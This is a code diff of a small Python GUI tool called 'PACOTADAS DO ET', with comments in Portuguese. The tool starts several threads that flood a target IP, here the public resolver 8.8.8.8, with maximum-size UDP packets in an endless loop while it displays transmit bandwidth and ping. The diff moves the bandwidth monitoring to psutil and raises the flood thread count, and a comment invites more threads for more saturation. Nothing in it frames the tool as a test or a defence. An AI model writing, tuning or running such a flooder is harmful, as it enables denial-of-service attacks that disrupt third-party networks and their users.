@@ -4,73 +4,55 @@ import psutil
 import time
 import subprocess
 import socket
-import sys
 
-try:
-    import win32pdh
-except Exception as e:
-    win32pdh = None
-    pdh_error = str(e)
-else:
-    pdh_error = None
+# === CONFIG ===
+TARGET_IP     = "8.8.8.8"    # IP para ping e flood
+TARGET_PORT   = 80           # Porta para flood UDP
+BUFFER_SIZE   = 65507        # Tamanho do payload UDP
+FLOOD_THREADS = 6            # Aumente se quiser mais saturação
+IFACE_NAME    = "Ethernet"   # Nome exato da interface
 
-# CONFIGURAÇÕES
-TARGET_IP = "8.8.8.8"
-TARGET_PORT = 80
-BUFFER_SIZE = 65507
-FLOOD_THREADS = 4
-INTERFACE_NAME = "Ethernet"
-
-# PDH setup
-query = counter = None
-if win32pdh:
-    try:
-        query = win32pdh.OpenQuery()
-        path = rf"\Network Interface({INTERFACE_NAME})\Bytes Total/sec"
-        counter = win32pdh.AddCounter(query, path)
-        win32pdh.CollectQueryData(query)
-    except Exception as e:
-        pdh_error = f"PDH setup failed: {e}"
-
-# Função flood
+# === FUNÇÕES ===
 def flood_packets():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = b'A' * BUFFER_SIZE
-        while True:
-            s.sendto(payload, (TARGET_IP, TARGET_PORT))
-    except Exception as e:
-        print("Flood error:", e, file=sys.stderr)
-
-# Função ping
-def get_ping(ip):
-    try:
-        res = subprocess.run(["ping", "-n", "1", ip], capture_output=True, text=True)
-        for line in res.stdout.splitlines():
-            if "tempo=" in line or "time=" in line:
-                return (line.split("tempo=")[-1] if "tempo=" in line else line.split("time=")[-1]).split()[0]
-    except:
-        return "Erro"
-    return "Timeout"
-
-# Atualiza GUI
-def update_info():
-    if pdh_error:
-        status_var.set(pdh_error)
-        return
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = b"A" * BUFFER_SIZE
     while True:
         try:
-            win32pdh.CollectQueryData(query)
-            _, val = win32pdh.GetFormattedCounterValue(counter, win32pdh.PDH_FMT_DOUBLE)
-            mbps = val * 8 / 1_000_000
-            ping = get_ping(TARGET_IP)
-            status_var.set(f"TX: {mbps:.1f} Mbps    Ping: {ping}")
-        except Exception as e:
-            status_var.set(f"Update error: {e}")
-            break
-        time.sleep(1)
+            sock.sendto(data, (TARGET_IP, TARGET_PORT))
+        except:
+            time.sleep(0.1)
 
-# Monta GUI
+def get_ping(ip):
+    try:
+        out = subprocess.run(["ping", "-n", "1", ip], capture_output=True, text=True).stdout
+        for l in out.splitlines():
+            if "tempo=" in l or "time=" in l:
+                return (l.split("tempo=")[-1] if "tempo=" in l else l.split("time=")[-1]).split()[0]
+    except:
+        return "Err"
+    return "T/o"
+
+def monitor_iface(label_var):
+    prev = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
+    if not prev:
+        label_var.set(f"Interface '{IFACE_NAME}' não encontrada")
+        return
+    prev_sent = prev.bytes_sent
+    while True:
+        time.sleep(1)
+        stats = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
+        if not stats:
+            label_var.set(f"Interface '{IFACE_NAME}' ausente")
+            break
+        curr_sent = stats.bytes_sent
+        delta = curr_sent - prev_sent
+        prev_sent = curr_sent
+        # bytes -> megabits
+        mbps = (delta * 8) / 1_000_000
+        ping = get_ping(TARGET_IP)
+        label_var.set(f"TX: {mbps:.1f} Mbps   Ping: {ping}")
+
+# === GUI ===
 root = tk.Tk()
 root.title("PACOTADAS DO ET")
 root.geometry("400x150")
@@ -78,17 +60,18 @@ root.resizable(False, False)
 root.configure(bg="black")
 
 tk.Label(root, text="PACOTADAS DO ET",
-         font=("Helvetica", 24, "bold"), fg="lime", bg="black")\
-  .pack(pady=10)
+         font=("Helvetica", 24, "bold"),
+         fg="lime", bg="black").pack(pady=10)
 
-status_var = tk.StringVar(value="Inicializando...")
-tk.Label(root, textvariable=status_var,
-         font=("Consolas", 16), fg="white", bg="black")\
-  .pack(pady=10)
+status = tk.StringVar(value="Inicializando...")
+tk.Label(root, textvariable=status,
+         font=("Consolas", 16),
+         fg="white", bg="black").pack()
 
-# Start threads only if GUI built
-threading.Thread(target=update_info, daemon=True).start()
+# === INÍCIO DOS THREADS ===
 for _ in range(FLOOD_THREADS):
     threading.Thread(target=flood_packets, daemon=True).start()
+
+threading.Thread(target=monitor_iface, args=(status,), daemon=True).start()
 
 root.mainloop()
